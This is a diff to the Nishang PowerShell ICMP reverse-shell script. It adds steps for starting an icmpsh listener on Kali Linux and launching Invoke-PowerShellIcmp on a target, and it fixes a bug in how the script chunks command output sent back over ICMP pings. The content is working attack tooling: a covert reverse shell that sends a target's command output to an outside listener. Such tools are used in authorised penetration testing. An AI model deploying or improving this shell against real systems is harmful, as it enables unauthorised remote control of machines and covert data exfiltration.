@@ -19,7 +19,15 @@ Time in seconds for which the script waits for a command from the server. Defaul
 The size of output Buffer. Defualt is 128.
 
 .EXAMPLE
-PS > Invoke-PowerShellIcmp-IPAddress 192.168.254.226
+# sysctl -w net.ipv4.icmp_echo_ignore_all=1
+# python icmpsh_m.py 192.168.254.226 192.168.254.1
+
+Run above commands to start a listener on a Linux computer (tested on Kali Linux).
+icmpsh_m.py is a part of the icmpsh tools.
+
+On the target, run the below command.
+
+PS > Invoke-PowerShellIcmp -IPAddress 192.168.254.226
 
 Above shows an example of an interactive PowerShell reverse connect shell. 
 
@@ -79,10 +87,10 @@ https://github.com/samratashok/nishang
                     $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                     $i +=1
                 }
-                $remainingindex = $sendbytes.Length%$BufferSize
+                $remainingindex = $sendbytes.Length % $BufferSize
                 if ($remainingindex -ne 0)
                 {
-                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($remainingindex)]
+                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                     $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                 }
             }
